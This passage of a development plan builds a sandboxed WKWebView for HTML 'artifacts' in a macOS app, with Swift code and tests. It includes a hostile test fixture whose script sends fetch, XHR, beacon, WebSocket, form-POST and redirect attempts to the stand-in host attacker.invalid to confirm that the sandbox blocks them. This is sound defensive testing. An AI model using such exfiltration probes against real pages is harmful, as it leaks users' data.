        let ext = (originalName as NSString).pathExtension
        let newFilename = uniqueFilename(in: dir, base: "\(baseName) copy", ext: ext.isEmpty ? "md" : ext)
```

Breadcrumb display name (line 1321) — replace `var displayName = part.hasSuffix(".md") ? String(part.dropLast(3)) : part` with:

```swift
                var displayName = part.removingPageExtension
```

`companionFolderPath` (1914-1917) — behavior unchanged (artifacts have no companions, decision 3); document the contract:

```swift
    /// Companion folders are a page (.md) concept. Artifacts (.html) and other
    /// file types have no companion; every caller that moves/trashes companions
    /// is additionally gated on `.hasSuffix(".md")`, so this returns the input
    /// unchanged for them.
    nonisolated private func companionFolderPath(for mdPath: String) -> String {
        guard mdPath.hasSuffix(".md") else { return mdPath }
        return String(mdPath.dropLast(3))
    }
```

In `FileTreeItemView.swift` — `displayName` (214-219):

```swift
    private var displayName: String {
        if entry.isDatabase { return entry.name }
        return entry.name.removingPageExtension
    }
```

`commitRename` (363-377) — replace the hardcoded `.md` (line 369):

```swift
    private func commitRename() {
        isRenaming = false
        let trimmed = renameName.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty, trimmed != displayName else { return }

        let dir = (entry.path as NSString).deletingLastPathComponent
        let ext: String
        if entry.isDatabase || entry.isDirectory {
            ext = ""
        } else {
            let pathExt = (entry.path as NSString).pathExtension
            ext = pathExt.isEmpty ? "" : ".\(pathExt)"
        }
        let newPath = (dir as NSString).appendingPathComponent("\(trimmed)\(ext)")

        try? fileSystem.renameFile(from: entry.path, to: newPath)
        if entry.isDatabase {
            try? fileSystem.updateDatabaseDisplayName(at: newPath, name: trimmed)
        }
        onRefreshTree()
    }
```

(`"foo.db.md"` keeps working: `pathExtension` is `"md"` → `.md`, same as before.)

In `ContentView.swift` — both loader guards, so clicking an artifact never feeds HTML to the markdown parser and never creates a `blockDocuments` entry:

```swift
        // loadFileContentForPane, line 3268 — add after !entry.isDatabaseRow,:
        guard !entry.isDatabase,
              !entry.isDatabaseRow,
              !entry.isArtifact,
              !entry.isSkill,
              // ... rest of the existing guard unchanged
```

```swift
        // loadFileContent, line 4210:
        guard !entry.isDatabase, !entry.isDatabaseRow, !entry.isSkill, !entry.isArtifact else { return }
```

- [ ] **Step 3.4: Run to verify pass**

Run: `swift test --filter FileSystemServiceTests`
Expected: PASS (all new tests + existing ones — the rename to `documentTreeItem` must not break existing tree tests).

- [ ] **Step 3.5: Commit**

```bash
git add Sources/Bugbook/Services/FileSystemService.swift Sources/Bugbook/Views/Sidebar/FileTreeItemView.swift Sources/Bugbook/Views/ContentView.swift Tests/BugbookTests/FileSystemServiceTests.swift
git commit -m "Admit .html files in the sidebar as artifacts and fix extension-hardcoded file ops"
```

After this commit artifacts are visible and manageable in the sidebar; clicking one shows a blank pane (routing lands in Task 5).

---

## Task 4: Artifact sandbox + hostile fixture + empirical verification — GATE STEP

The design doc's riskiest unknown — CSP headers from a custom scheme handler and content-rule-list enforcement for custom-scheme pages on current WebKit — is burned down **here, before any pane chrome exists**. Exit criterion: `testBenignArtifactRenders` and `testHostileFixtureAllProbesBlocked` pass. If WebKit misbehaves, redesign at this step (e.g. inject CSP via meta-rewrite, tighten the nav delegate) before building UI on top.

**Files:**
- Create: `Sources/Bugbook/Services/ArtifactSandbox.swift`
- Modify: `Package.swift:107-115` (test resources)
- Create: `Tests/BugbookTests/Fixtures/hostile-artifact.html`
- Create: `Tests/BugbookTests/ArtifactSchemeHandlerTests.swift`
- Create: `Tests/BugbookTests/ArtifactSandboxLiveTests.swift`

- [ ] **Step 4.1: Declare the test fixture resources**

In `Package.swift`, BugbookTests target (lines 107-115), add `resources:`:

```swift
        .testTarget(
            name: "BugbookTests",
            dependencies: [
                "Bugbook",
                "BugbookCore",
            ],
            path: "Tests/BugbookTests",
            exclude: ["perf_baseline.tsv"],
            resources: [.copy("Fixtures")]
        ),
```

- [ ] **Step 4.2: Write the hostile fixture**

Create `Tests/BugbookTests/Fixtures/hostile-artifact.html`. Every probe must report `blocked` except the `control-img-data` data-URI control (which proves the harness can observe a successful load). Navigation probes run serialized last — if any succeeds the page unloads and `__probesComplete` never appears, which the native test treats as failure.

```html
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="bugbook-artifact" content="1">
<meta name="bugbook-title" content="Hostile Artifact — escape-attempt fixture">
<meta name="bugbook-generator" content="bugbook-tests/fixture">
</head>
<body>
<h1>Hostile artifact fixture</h1>
<p>Every probe below must report <strong>blocked</strong> (except the data-URI control).</p>
<form id="exfil-form" action="https://attacker.invalid/collect" method="POST">
  <input type="hidden" name="d" value="exfil">
</form>
<pre id="results">running…</pre>
<script>
(function () {
  "use strict";
  const results = {};
  const REMOTE = "https://attacker.invalid";

  function record(name, value) { results[name] = value; }

  function withTimeout(promise, ms) {
    return Promise.race([
      promise,
      new Promise(resolve => setTimeout(() => resolve("blocked"), ms)),
    ]);
  }

  // --- Parallel, non-navigating probes ---------------------------------
  const parallel = [];

  parallel.push(withTimeout(
    fetch(REMOTE + "/fetch").then(() => "allowed").catch(() => "blocked"), 1500
  ).then(v => record("fetch-https", v)));

  parallel.push(withTimeout(new Promise(resolve => {
    try {
      const xhr = new XMLHttpRequest();
      xhr.open("GET", REMOTE + "/xhr");
      xhr.onload = () => resolve("allowed");
      xhr.onerror = () => resolve("blocked");
      xhr.send();
    } catch (e) { resolve("blocked"); }
  }), 1500).then(v => record("xhr-https", v)));

  parallel.push(withTimeout(new Promise(resolve => {
    const img = new Image();
    img.onload = () => resolve("allowed");
    img.onerror = () => resolve("blocked");
    img.src = REMOTE + "/beacon.gif";
  }), 1500).then(v => record("img-beacon", v)));

  parallel.push(withTimeout(new Promise(resolve => {
    try {
      const ws = new WebSocket("wss://attacker.invalid/ws");
      ws.onopen = () => resolve("allowed");
      ws.onerror = () => resolve("blocked");
    } catch (e) { resolve("blocked"); }
  }), 1500).then(v => record("websocket", v)));

  parallel.push(withTimeout(new Promise(resolve => {
    const frame = document.createElement("iframe");
    frame.onload = () => resolve("allowed");
    frame.src = REMOTE + "/frame";
    document.body.appendChild(frame);
  }), 1200).then(v => record("iframe-https", v)));

  // Sibling-token read: a fabricated token must be refused by the handler
  // (and connect-src 'none' blocks the fetch anyway).
  parallel.push(withTimeout(
    fetch("bugbook-artifact://a/00000000-0000-0000-0000-000000000000")
      .then(() => "allowed").catch(() => "blocked"), 1500
  ).then(v => record("sibling-token-read", v)));

  // window.open must never produce a window.
  try {
    const w = window.open(REMOTE + "/popup");
    record("window-open", w === null ? "blocked" : "allowed");
  } catch (e) { record("window-open", "blocked"); }

  // Persistence: anything surviving from a previous session means the data
  // store leaked. Write after reading so a second run would detect it.
  try {
    const prior = window.localStorage.getItem("hostile-persist");
    record("persistence-localStorage", prior === null ? "blocked" : "allowed");
    window.localStorage.setItem("hostile-persist", "1");
  } catch (e) { record("persistence-localStorage", "blocked"); }
  try {
    const hadCookie = document.cookie.indexOf("hostile=1") !== -1;
    record("persistence-cookie", hadCookie ? "allowed" : "blocked");
    document.cookie = "hostile=1";
  } catch (e) { record("persistence-cookie", "blocked"); }

  // Control: data-URI images are allowed by CSP (img-src data:) — proves the
  // harness can observe a successful load.
  parallel.push(withTimeout(new Promise(resolve => {
    const img = new Image();
    img.onload = () => resolve("allowed");
    img.onerror = () => resolve("blocked");
    img.src = "data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==";
  }), 1500).then(v => record("control-img-data", v)));

  // --- Serialized navigation probes (if any succeeds the page unloads and
  // __probesComplete never appears — the native test treats that as failure).
  function liveAfter(action, ms) {
    return new Promise(resolve => {
      try { action(); } catch (e) { /* throw = blocked */ }
      setTimeout(() => resolve("blocked"), ms);
    });
  }

  Promise.all(parallel)
    .then(() => liveAfter(() => {
      const meta = document.createElement("meta");
      meta.httpEquiv = "refresh";
      meta.content = "0;url=" + REMOTE + "/refresh";
      document.head.appendChild(meta);
    }, 700).then(v => record("meta-refresh", v)))
    .then(() => liveAfter(() => document.getElementById("exfil-form").submit(), 700)
      .then(v => record("form-action", v)))
    .then(() => liveAfter(() => { window.location.href = REMOTE + "/loc"; }, 700)
      .then(v => record("location-assign", v)))
    .then(() => {
      window.__results = results;
      window.__probesComplete = true;
      document.getElementById("results").textContent = JSON.stringify(results, null, 2);
    });
})();
</script>
</body>
</html>
```

- [ ] **Step 4.3: Implement the sandbox**

Create `Sources/Bugbook/Services/ArtifactSandbox.swift`. WebKit ordering constraints honored: the scheme handler is registered on the configuration **before** `WKWebView` init; rule-list compilation is async and a configuration is only built *after* a rule list exists (fail closed). The navigation policy must be **retained by the caller** (`navigationDelegate`/`uiDelegate` are weak).

```swift
import Foundation
import WebKit

/// Locked-down WKWebView plumbing for HTML artifacts (Level 1).
///
/// Threat model: the artifact author is an agent that may be operating under
/// prompt injection — every artifact is treated as attacker-controlled code.
/// Defenses, layered:
///  - custom scheme handler serving exactly one token-mapped file (T2),
///  - CSP response header denying all remote loads (T1),
///  - WKContentRuleList blocking http(s)/ws(s) in the network process (T1, kill switch),
///  - non-persistent website data store (T6),
///  - navigation delegate cancelling everything except the artifact itself,
///    with native confirmation for user-clicked external links (T1/T4).
enum ArtifactSandbox {
    static let scheme = "bugbook-artifact"

    /// Served as a real response header by the scheme handler.
    static let contentSecurityPolicy =
        "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; " +
        "img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; " +
        "base-uri 'none'; frame-src 'none'"

    /// Compiled in the network process — blocks even loads CSP might miss.
    static let networkBlockRulesJSON = """
    [
        {"trigger": {"url-filter": "^https?://"}, "action": {"type": "block"}},
        {"trigger": {"url-filter": "^wss?://"}, "action": {"type": "block"}}
    ]
    """

    private static let ruleListIdentifier = "BugbookArtifactNetworkBlock.v1"
    @MainActor private static var cachedRuleList: WKContentRuleList?

    enum SandboxError: LocalizedError {
        case unknownResource
        case ruleListUnavailable

        var errorDescription: String? {
            switch self {
            case .unknownResource:
                return "Requested resource is not registered with this artifact pane."
            case .ruleListUnavailable:
                return "The artifact network-block rule list could not be compiled."
            }
        }
    }

    /// Compiles (or returns the cached) network-block rule list.
    /// Throws when compilation fails — callers must treat that as fatal for
    /// rendering (fail closed): an artifact never loads without the rule list.
    @MainActor
    static func networkBlockRuleList() async throws -> WKContentRuleList {
        if let cachedRuleList { return cachedRuleList }
        let compiled: WKContentRuleList? = try await withCheckedThrowingContinuation { continuation in
            WKContentRuleListStore.default().compileContentRuleList(
                forIdentifier: ruleListIdentifier,
                encodedContentRuleList: networkBlockRulesJSON
            ) { ruleList, error in
                if let error {
                    continuation.resume(throwing: error)
                } else {
                    continuation.resume(returning: ruleList)
                }
            }
        }
        guard let compiled else { throw SandboxError.ruleListUnavailable }
        cachedRuleList = compiled
        return compiled
    }

    /// Builds the locked-down configuration. The scheme handler must be attached
    /// here, before WKWebView init — WebKit rejects later registration.
    @MainActor
    static func makeConfiguration(
        handler: ArtifactSchemeHandler,
        ruleList: WKContentRuleList
    ) -> WKWebViewConfiguration {
        let configuration = WKWebViewConfiguration()
        configuration.websiteDataStore = .nonPersistent()
        configuration.defaultWebpagePreferences.allowsContentJavaScript = true
        configuration.preferences.javaScriptCanOpenWindowsAutomatically = false
        configuration.setURLSchemeHandler(handler, forURLScheme: scheme)
        configuration.userContentController.add(ruleList)
        return configuration
    }
}

/// Serves exactly one registered file at `bugbook-artifact://a/<UUID-token>`.
/// Every other request — sub-resources, sibling tokens, traversal attempts —
/// fails. The real file path never reaches page JS (no file:// origin).
@MainActor
final class ArtifactSchemeHandler: NSObject, WKURLSchemeHandler {
    let fileURL: URL
    let token: String

    /// The only URL this handler will ever serve. One token per pane open;
    /// FSEvents live-reload re-serves fresh bytes through the same token (the
    /// data store is non-persistent and pane-scoped, so a stable within-open
    /// origin grants no cross-artifact persistence).
    var artifactURL: URL {
        URL(string: "\(ArtifactSandbox.scheme)://a/\(token)")!
    }

    init(fileURL: URL) {
        self.fileURL = fileURL
        self.token = UUID().uuidString
    }

    func webView(_ webView: WKWebView, start urlSchemeTask: WKURLSchemeTask) {
        guard let requested = urlSchemeTask.request.url,
              requested.absoluteString == artifactURL.absoluteString else {
            Log.fileSystem.error("ArtifactSchemeHandler refused unregistered resource request")
            urlSchemeTask.didFailWithError(ArtifactSandbox.SandboxError.unknownResource)
            return
        }

        do {
            // Synchronous read is deliberate: artifacts are single small files
            // (CLI validate errors above 10 MB) and replies complete before any
            // concurrent stop() bookkeeping would be needed.
            let data = try Data(contentsOf: fileURL)
            guard let response = HTTPURLResponse(
                url: requested,
                statusCode: 200,
                httpVersion: "HTTP/1.1",
                headerFields: [
                    "Content-Type": "text/html; charset=utf-8",
                    "Content-Length": String(data.count),
                    "Content-Security-Policy": ArtifactSandbox.contentSecurityPolicy,
                    "Cache-Control": "no-store",
                ]
            ) else {
                urlSchemeTask.didFailWithError(ArtifactSandbox.SandboxError.unknownResource)
                return
            }
            urlSchemeTask.didReceive(response)
            urlSchemeTask.didReceive(data)
            urlSchemeTask.didFinish()
        } catch {
            Log.fileSystem.error("ArtifactSchemeHandler failed to read artifact: \(error.localizedDescription)")
            urlSchemeTask.didFailWithError(error)
        }
    }

    func webView(_ webView: WKWebView, stop urlSchemeTask: WKURLSchemeTask) {
        // Replies are synchronous in start(); nothing in flight to cancel.
    }
}

/// Navigation policy: the artifact document itself (initial load, reloads, and
/// same-document #anchor jumps) is the only permitted navigation. User-activated
/// http(s) links surface a native confirmation; everything else is cancelled.
/// Also the WKUIDelegate, so target=_blank routes through the same confirmation
/// and window.open never creates a window.
@MainActor
final class ArtifactNavigationPolicy: NSObject, WKNavigationDelegate, WKUIDelegate {
    private let artifactURL: URL
    var onExternalLinkRequest: ((URL) -> Void)?
    var onLoadFinished: (() -> Void)?
    var onLoadFailed: ((String) -> Void)?

    init(artifactURL: URL) {
        self.artifactURL = artifactURL
    }

    func webView(
        _ webView: WKWebView,
        decidePolicyFor navigationAction: WKNavigationAction,
        decisionHandler: @escaping (WKNavigationActionPolicy) -> Void
    ) {
        guard let url = navigationAction.request.url else {
            decisionHandler(.cancel)
            return
        }

        // The artifact itself, main frame only — covers the initial load,
        // FSEvents-driven reload(), and in-page #anchor navigation (TOC links
        // inside artifacts must keep working, decision 6). Sibling-token
        // probing has a different path → cancelled here AND refused by the
        // scheme handler.
        if navigationAction.targetFrame?.isMainFrame == true,
           stripFragment(url) == stripFragment(artifactURL) {
            decisionHandler(.allow)
            return
        }

        if navigationAction.navigationType == .linkActivated,
           let scheme = url.scheme?.lowercased(),
           scheme == "http" || scheme == "https" {
            onExternalLinkRequest?(url)
        }

        decisionHandler(.cancel)
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        onLoadFinished?()
    }

    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        onLoadFailed?(error.localizedDescription)
    }

    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        onLoadFailed?(error.localizedDescription)
    }

    private func stripFragment(_ url: URL) -> String {
        var components = URLComponents(url: url, resolvingAgainstBaseURL: false)
        components?.fragment = nil
        return components?.string ?? url.absoluteString
    }

    // MARK: - WKUIDelegate

    func webView(
        _ webView: WKWebView,
        createWebViewWith configuration: WKWebViewConfiguration,
        for navigationAction: WKNavigationAction,
        windowFeatures: WKWindowFeatures
    ) -> WKWebView? {
        if navigationAction.navigationType == .linkActivated,
           let url = navigationAction.request.url,
           let scheme = url.scheme?.lowercased(),
           scheme == "http" || scheme == "https" {
            onExternalLinkRequest?(url)
        }
        return nil  // window.open and target=_blank never spawn a window
    }
}
```

- [ ] **Step 4.4: Write the scheme-handler unit tests (no page loads, deterministic)**

Create `Tests/BugbookTests/ArtifactSchemeHandlerTests.swift`:

```swift
import XCTest
import WebKit
@testable import Bugbook

/// Records everything the handler sends. WKURLSchemeTask is a protocol, so the
/// handler is exercised directly without loading a page.
private final class MockSchemeTask: NSObject, WKURLSchemeTask {
    let request: URLRequest
    private(set) var receivedResponse: URLResponse?
    private(set) var receivedData = Data()
    private(set) var didFinishCalled = false
    private(set) var failedError: Error?

    init(url: URL) {
        self.request = URLRequest(url: url)
    }

    func didReceive(_ response: URLResponse) { receivedResponse = response }
    func didReceive(_ data: Data) { receivedData.append(data) }
    func didFinish() { didFinishCalled = true }
    func didFailWithError(_ error: Error) { failedError = error }
}

@MainActor
final class ArtifactSchemeHandlerTests: XCTestCase {
    private var tempDir: URL!
    private var fileURL: URL!
    private let html = #"<!doctype html><meta name="bugbook-artifact" content="1"><h1>ok</h1>"#

    override func setUp() async throws {
        tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("ArtifactSchemeHandlerTests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        fileURL = tempDir.appendingPathComponent("a.html")
        try html.write(to: fileURL, atomically: true, encoding: .utf8)
    }

    override func tearDown() async throws {
        if let tempDir { try? FileManager.default.removeItem(at: tempDir) }
    }

    func testServesRegisteredTokenWithCSPHeader() {
        let handler = ArtifactSchemeHandler(fileURL: fileURL)
        let task = MockSchemeTask(url: handler.artifactURL)
        handler.webView(WKWebView(), start: task)

        let response = task.receivedResponse as? HTTPURLResponse
        XCTAssertEqual(response?.statusCode, 200)
        XCTAssertEqual(
            response?.value(forHTTPHeaderField: "Content-Security-Policy"),
            ArtifactSandbox.contentSecurityPolicy
        )
        XCTAssertEqual(response?.value(forHTTPHeaderField: "Content-Type"), "text/html; charset=utf-8")
        XCTAssertEqual(task.receivedData, Data(html.utf8))
        XCTAssertTrue(task.didFinishCalled)
        XCTAssertNil(task.failedError)
    }

    func testRefusesUnregisteredToken() {
        let handler = ArtifactSchemeHandler(fileURL: fileURL)
        let task = MockSchemeTask(
            url: URL(string: "bugbook-artifact://a/00000000-0000-0000-0000-000000000000")!)
        handler.webView(WKWebView(), start: task)

        XCTAssertNotNil(task.failedError)
        XCTAssertNil(task.receivedResponse)
        XCTAssertTrue(task.receivedData.isEmpty)
        XCTAssertFalse(task.didFinishCalled)
    }

    func testRefusesSubResourceUnderToken() {
        let handler = ArtifactSchemeHandler(fileURL: fileURL)
        let task = MockSchemeTask(url: handler.artifactURL.appendingPathComponent("x.png"))
        handler.webView(WKWebView(), start: task)
        XCTAssertNotNil(task.failedError)
        XCTAssertNil(task.receivedResponse)
    }

    func testServesFreshBytesAfterFileChangeWithSameToken() throws {
        // Locks the live-reload contract: same token, fresh bytes (decision 2).
        let handler = ArtifactSchemeHandler(fileURL: fileURL)
        let first = MockSchemeTask(url: handler.artifactURL)
        handler.webView(WKWebView(), start: first)
        XCTAssertEqual(first.receivedData, Data(html.utf8))

        let updated = html + "<p>v2</p>"
        try updated.write(to: fileURL, atomically: true, encoding: .utf8)
        let second = MockSchemeTask(url: handler.artifactURL)
        handler.webView(WKWebView(), start: second)
        XCTAssertEqual(second.receivedData, Data(updated.utf8))
    }

    func testTokensAreUniquePerHandler() {
        XCTAssertNotEqual(
            ArtifactSchemeHandler(fileURL: fileURL).token,
            ArtifactSchemeHandler(fileURL: fileURL).token
        )
    }
}
```

- [ ] **Step 4.5: Write the live WKWebView tests (the empirical gate)**

Create `Tests/BugbookTests/ArtifactSandboxLiveTests.swift`. Flakiness mitigations: `BUGBOOK_SKIP_WEBKIT_TESTS=1` skip for headless CI; one shared rule list (first compile can take ~1 s); `await fulfillment(of:)` (NOT `wait(for:)` — it deadlocks in async tests); generous timeouts.

```swift
import XCTest
import WebKit
@testable import Bugbook

/// Live WKWebView verification of the sandbox — the design doc's mandated
/// empirical check that CSP-via-scheme-handler and content rule lists behave
/// on current WebKit. Set BUGBOOK_SKIP_WEBKIT_TESTS=1 to skip (headless CI).
@MainActor
final class ArtifactSandboxLiveTests: XCTestCase {
    private var tempDir: URL!
    private var retainedPolicies: [ArtifactNavigationPolicy] = []
    private var retainedWebViews: [WKWebView] = []

    override func setUp() async throws {
        if ProcessInfo.processInfo.environment["BUGBOOK_SKIP_WEBKIT_TESTS"] == "1" {
            throw XCTSkip("WebKit live tests disabled by BUGBOOK_SKIP_WEBKIT_TESTS")
        }
        tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("ArtifactSandboxLiveTests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
    }

    override func tearDown() async throws {
        for webView in retainedWebViews {
            webView.navigationDelegate = nil
            webView.uiDelegate = nil
            webView.stopLoading()
        }
        retainedWebViews = []
        retainedPolicies = []
        if let tempDir { try? FileManager.default.removeItem(at: tempDir) }
    }

    func testNetworkBlockRuleListCompiles() async throws {
        _ = try await ArtifactSandbox.networkBlockRuleList()
    }

    func testBenignArtifactRenders() async throws {
        // Control for fail-closed: scheme handler + rule list + CSP must not
        // break a legitimate inline-everything artifact.
        let url = try write("benign.html", html: """
        <!doctype html><html><head>
        <meta name="bugbook-artifact" content="1">
        <title>start</title>
        </head><body>
        <a id="anchor-link" href="#section">jump</a>
        <div id="section" style="margin-top: 2000px">target</div>
        <script>document.title = "rendered";</script>
        </body></html>
        """)
        let webView = try await loadArtifact(at: url)

        let title = await pollJS(webView, script: "document.title", until: { $0 == "rendered" })
        XCTAssertEqual(title, "rendered")

        // In-page anchor navigation must not be cancelled (decision 6).
        _ = await pollJS(
            webView,
            script: "document.getElementById('anchor-link').click(); 'clicked'",
            until: { $0 == "clicked" }
        )
        let hash = await pollJS(webView, script: "window.location.hash", until: { $0 == "#section" })
        XCTAssertEqual(hash, "#section")
    }

    func testHostileFixtureAllProbesBlocked() async throws {
        let fixtureURL = try XCTUnwrap(Bundle.module.url(
            forResource: "hostile-artifact", withExtension: "html", subdirectory: "Fixtures"))
        let webView = try await loadArtifact(at: fixtureURL)
        try await assertAllProbesBlocked(webView)
    }

    func testNoPersistenceAcrossSessions() async throws {
        // Two separately-constructed sessions: anything surviving into the
        // second (localStorage item, cookie) flips its probe to "allowed".
        let fixtureURL = try XCTUnwrap(Bundle.module.url(
            forResource: "hostile-artifact", withExtension: "html", subdirectory: "Fixtures"))
        for _ in 0..<2 {
            let webView = try await loadArtifact(at: fixtureURL)
            try await assertAllProbesBlocked(webView)
        }
    }

    // MARK: - Harness

    private func write(_ name: String, html: String) throws -> URL {
        let url = tempDir.appendingPathComponent(name)
        try html.write(to: url, atomically: true, encoding: .utf8)
        return url
    }

    private func loadArtifact(at url: URL) async throws -> WKWebView {
        let ruleList = try await ArtifactSandbox.networkBlockRuleList()
        let handler = ArtifactSchemeHandler(fileURL: url)
        let policy = ArtifactNavigationPolicy(artifactURL: handler.artifactURL)
        retainedPolicies.append(policy)  // delegates are weak — must retain
        let configuration = ArtifactSandbox.makeConfiguration(handler: handler, ruleList: ruleList)
        let webView = WKWebView(
            frame: .init(x: 0, y: 0, width: 800, height: 600),
            configuration: configuration
        )
        webView.navigationDelegate = policy
        webView.uiDelegate = policy
        retainedWebViews.append(webView)
        webView.load(URLRequest(url: handler.artifactURL))
        return webView
    }

    private func assertAllProbesBlocked(_ webView: WKWebView) async throws {
        let json = await pollJS(
            webView,
            script: "window.__probesComplete === true ? JSON.stringify(window.__results) : null",
            until: { $0 != nil },
            timeout: 30
        )
        let results = try XCTUnwrap(
            try JSONSerialization.jsonObject(with: Data((json ?? "{}").utf8)) as? [String: String],
            "probes never completed — a navigation probe may have escaped (page unloaded)"
        )

        XCTAssertEqual(results["control-img-data"], "allowed",
                       "data: URI control must load — otherwise blocked results are meaningless")
        for (probe, outcome) in results where probe != "control-img-data" {
            XCTAssertEqual(outcome, "blocked", "escape probe '\(probe)' was not blocked")
        }
        XCTAssertGreaterThanOrEqual(results.count, 13, "fixture must report all probes")
    }

    private final class ResultBox { var value: String? }

    /// Polls `script` every 200 ms until `until` accepts the value.
    /// `fulfillment(of:)` keeps the main run loop serviced for WebKit callbacks.
    @discardableResult
    private func pollJS(
        _ webView: WKWebView,
        script: String,
        until accept: @escaping (String?) -> Bool,
        timeout: TimeInterval = 15
    ) async -> String? {
        let done = expectation(description: "pollJS")
        let box = ResultBox()
        var fulfilled = false

        func tick() {
            webView.evaluateJavaScript(script) { value, _ in
                guard !fulfilled else { return }
                let string = value as? String
                if accept(string) {
                    fulfilled = true
                    box.value = string
                    done.fulfill()
                } else {
                    DispatchQueue.main.asyncAfter(deadline: .now() + 0.2) { tick() }
                }
            }
        }
        tick()
        await fulfillment(of: [done], timeout: timeout)
        fulfilled = true  // stop rescheduling after timeout
        return box.value
    }
}
```

- [ ] **Step 4.6: Run the gate**

Run: `swift build && swift test --filter ArtifactSchemeHandlerTests && swift test --filter ArtifactSandboxLiveTests`
Expected: all PASS. **This is the empirical verification the design doc mandates (§6 risk a).** If `testHostileFixtureAllProbesBlocked` shows an `allowed` probe or `testBenignArtifactRenders` fails:
- CSP header ignored on custom scheme → fall back: have the scheme handler inject `<meta http-equiv="Content-Security-Policy" content="…">` after `<head>` when serving (keep the response header too).
- Rule list not applied to custom-scheme pages → acceptable: CSP + navigation delegate + no-window-open still cover T1; document the reduced redundancy in `ArtifactSandbox` comments.
Do not proceed to Task 5 with a failing probe.

- [ ] **Step 4.7: Commit**

```bash
git add Sources/Bugbook/Services/ArtifactSandbox.swift Package.swift Tests/BugbookTests/Fixtures/hostile-artifact.html Tests/BugbookTests/ArtifactSchemeHandlerTests.swift Tests/BugbookTests/ArtifactSandboxLiveTests.swift
git commit -m "Add artifact WKWebView sandbox with hostile-fixture verification"
```

---

## Task 5: Artifact renderer, pane chrome, live reload, and routing

**Files:**
- Create: `Sources/Bugbook/Views/Artifacts/ArtifactWebView.swift`
- Create: `Sources/Bugbook/Views/Artifacts/ArtifactPaneView.swift`
- Modify: `Sources/Bugbook/Services/WorkspaceWatcher.swift` (add `latency` init param)
- Modify: `Sources/Bugbook/Views/ContentView.swift:2196 (routing), 1802-1808 (popover), ~5808 (helpers)`
- Create: `Tests/BugbookTests/ArtifactPaneModelTests.swift`

- [ ] **Step 5.1: Parameterize WorkspaceWatcher FSEvents latency**

The watcher hardcodes FSEvents latency `1.0`; with the design's ~300 ms reload target the artifact pane needs a lower value. In `Sources/Bugbook/Services/WorkspaceWatcher.swift`, add a stored property and init param (existing callers unaffected via the default):

```swift
    private let latency: CFTimeInterval

    init(
        debounceInterval: TimeInterval = 2.0,
        latency: CFTimeInterval = 1.0,
        onChange: @escaping () -> Void
    ) {
        self.debounceInterval = debounceInterval
        self.latency = latency
        self.onChange = onChange
    }
```

and in `watch(path:)` replace the literal `1.0, // latency — FSEvents batches changes within this window` argument to `FSEventStreamCreate` with:

```swift
            latency,
```

Run: `swift test --filter WorkspaceWatcherTests` — existing tests must still pass.

- [ ] **Step 5.2: Create ArtifactWebView**

Create `Sources/Bugbook/Views/Artifacts/ArtifactWebView.swift` (modeled on `MailHTMLView`, `MailPaneView.swift:888-941`; `isInspectable` follows the `WebKitBrowserEngine.swift:84-86` dev-only pattern):

```swift
import SwiftUI
import WebKit

/// Renders one artifact in a sandboxed WKWebView. The configuration must come
/// from ArtifactSandbox (scheme handler + rule list already attached) — this
/// view never constructs its own configuration, so it cannot render unprotected.
struct ArtifactWebView: NSViewRepresentable {
    let configuration: WKWebViewConfiguration
    let artifactURL: URL
    let navigationPolicy: ArtifactNavigationPolicy
    /// Bumped by the pane model when the file changes on disk; triggers a
    /// same-token reload that re-serves fresh bytes through the scheme handler.
    let reloadCounter: Int

    func makeNSView(context: Context) -> WKWebView {
        let webView = WKWebView(frame: .zero, configuration: configuration)
        webView.navigationDelegate = navigationPolicy
        webView.uiDelegate = navigationPolicy
        webView.allowsBackForwardNavigationGestures = false
        webView.setValue(false, forKey: "drawsBackground")
        if #available(macOS 13.3, *), AppEnvironment.isDev {
            webView.isInspectable = true
        }
        context.coordinator.lastReloadCounter = reloadCounter
        webView.load(URLRequest(url: artifactURL))
        return webView
    }

    func updateNSView(_ webView: WKWebView, context: Context) {
        guard context.coordinator.lastReloadCounter != reloadCounter else { return }
        context.coordinator.lastReloadCounter = reloadCounter
        webView.reload()
    }

    func makeCoordinator() -> Coordinator { Coordinator() }

    final class Coordinator {
        var lastReloadCounter = 0
    }
}
```

- [ ] **Step 5.3: Create ArtifactPaneView + ArtifactPaneModel**

Create `Sources/Bugbook/Views/Artifacts/ArtifactPaneView.swift`:

```swift
import SwiftUI
import AppKit
import WebKit
import BugbookCore

/// Pane chrome + lifecycle for one artifact: manifest-driven title/icon, reload,
/// reveal in Finder, a consent-banner slot reserved for Level 2, and
/// FSEvents-driven live reload so agent regeneration refreshes the open pane.
struct ArtifactPaneView: View {
    let filePath: String
    var onManifestLoaded: ((ArtifactManifest) -> Void)?
    var onOpenExternalURL: ((URL) -> Void)?

    @State private var model = ArtifactPaneModel()

    var body: some View {
        VStack(spacing: 0) {
            chromeBar

            // Level 2 consent banner mounts here — native chrome, never inside
            // the webview (anti-spoofing, threat T5). Inert at Level 1.

            Divider()

            content
        }
        .background(Color.fallbackEditorBg)
        .task(id: filePath) {
            model.onManifestLoaded = onManifestLoaded
            model.onExternalLinkRequest = { url in confirmExternalLink(url) }
            await model.open(filePath: filePath)
        }
        .onDisappear { model.close() }
    }

    @ViewBuilder
    private var content: some View {
        switch model.state {
        case .loading:
            Color.fallbackEditorBg
        case .failed(let message):
            failureView(message)
        case .ready(let session):
            ArtifactWebView(
                configuration: session.configuration,
                artifactURL: session.handler.artifactURL,
                navigationPolicy: session.navigationPolicy,
                reloadCounter: model.reloadCounter
            )
        }
    }

    private var chromeBar: some View {
        HStack(spacing: ShellZoomMetrics.size(8)) {
            Image(systemName: chromeIconName)
                .font(ShellZoomMetrics.font(Typography.bodySmall))
                .foregroundStyle(.secondary)
            Text(chromeTitle)
